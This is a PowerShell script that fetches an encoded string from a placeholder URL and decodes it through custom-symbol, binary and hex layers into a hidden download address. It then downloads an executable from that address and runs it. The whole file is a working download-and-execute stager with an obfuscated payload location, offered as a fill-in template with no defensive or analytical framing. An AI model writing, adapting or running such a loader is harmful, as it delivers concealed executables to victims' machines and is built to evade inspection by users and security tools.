# Function to replace characters in the input string according to the custom encoding
Function Convert-CustomEncodingToBinaryString {
    Param ([string]$inputString)
    $binaryString = $inputString -replace ',', '0' -replace '\.', '1' -replace '/', ','
    return $binaryString
}

# Function to convert binary string (delimited by commas) to ASCII text
Function Convert-BinaryToText {
    Param ([string]$binaryInput)
    $asciiOutput = @()
    $binaryValues = $binaryInput -split ','

    foreach ($value in $binaryValues) {
        if ($value.Length -eq 8) {
            try {
                $asciiOutput += [convert]::ToChar([convert]::ToInt32($value, 2))
            } catch {
                Write-Error "Invalid binary value: $value"
            }
        }
    }

    return -join $asciiOutput
}

# Function to convert hex string (delimited by commas) to ASCII text
Function Convert-HexToText {
    Param ([string]$hexInput)
    $asciiOutput = @()
    $hexValues = $hexInput -split ','

    foreach ($value in $hexValues) {
        if ($value.Length -eq 2) {
            try {
                $asciiOutput += [char][convert]::ToInt32($value, 16)
            } catch {
                Write-Error "Invalid hex value: $value"
            }
        }
    }

    return -join $asciiOutput
}



# URL of the hosted text file
$url = "https://yourtextfileurl.com" # Replace this with the actual URL containing the custom encoded string

# Use Invoke-RestMethod to fetch the content from the URL
$rawText = Invoke-RestMethod -Uri $url -ErrorAction Stop

# Display the raw text content for troubleshooting
Write-Host "Raw text from URL:"
Write-Host $rawText

# Convert the raw text to a binary string according to the custom encoding
$binaryString = Convert-CustomEncodingToBinaryString -inputString $rawText

# Display the binary string for troubleshooting
Write-Host "Binary string from custom encoding:"
Write-Host $binaryString

# Convert the binary string to ASCII text (hex string)
$hexText = Convert-BinaryToText -binaryInput $binaryString

# Display the hex string for troubleshooting
Write-Host "Hex string from binary:"
Write-Host $hexText

# Convert the hex string to ASCII text (URL)
$finalUrl = Convert-HexToText -hexInput $hexText

# Display the final URL for troubleshooting
Write-Host "Final URL from hex:"
Write-Host $finalUrl

# Specify the location where the file will be downloaded
$downloadPath = "C:\Path\To\DownloadedFile.exe" # Change to your desired path and filename

# Function to download the file from the URL
Function Download-File {
    Param ([string]$url, [string]$path)
    Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
}

# Function to execute the downloaded file
Function Execute-File {
    Param ([string]$filePath)
    if (Test-Path -Path $filePath) {
        Invoke-Item $filePath
    } else {
        Write-Error "The file at path $filePath does not exist."
    }
}

# Download the file from the final URL
Download-File -url $finalUrl -path $downloadPath

# Execute the downloaded file
Execute-File -filePath $downloadPath
